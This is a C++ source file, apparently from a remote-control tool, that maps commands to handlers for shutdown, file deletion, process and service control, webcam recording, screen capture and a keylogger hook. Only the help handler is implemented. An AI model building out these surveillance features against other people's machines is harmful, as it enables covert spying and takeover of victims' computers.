#include "services.h"

namespace Services {
    std::map<std::pair<std::string, std::string>, std::vector<std::string>(*)(Command)> servicesMap {
        {{"help", "get"},            &getHelp},
        {{"IP", "get"},              &getIP},
        {{"system", "shutdown"},     &shutdown}, 
        {{"system", "restart"},      &restart},
        {{"file", "list"},           &listFileAndFolder},
        {{"file", "delete"},         &deleteFile},
        {{"application", "list"},    &listApplications},
        {{"application", "start"},   &startApplication},
        {{"application", "stop"},    &stopApplication},
        {{"service", "list"},        &listServices},
        {{"service", "start"},       &startService},
        {{"service", "stop"},        &stopService},
        {{"webcam", "record"},       &webcamRecord},
        {{"screen", "capture"},      &screenShot},
        {{"keylogger", "hook"},      &keyLogger}
    };
};

bool Services::getHelp(std::string &help) {
    help = "FAIL to get HELP!";
    
    std::ifstream fin("src\\Help.txt");
    if (!fin.is_open())
        return false;
    
    std::string line;
    help = "";

    while (getline(fin, line))
        help = help + line + "\n";

    fin.close();
    return true;
}

// bool Services::getIP() {

// }

std::vector<std::string> Services::getHelp(Command command) {
    std::string help = "FAIL to get HELP!";
    Services::getHelp(help);
    return std::vector<std::string> ({help});
}

// std::vector<std::string> getIP(Command command) {

// }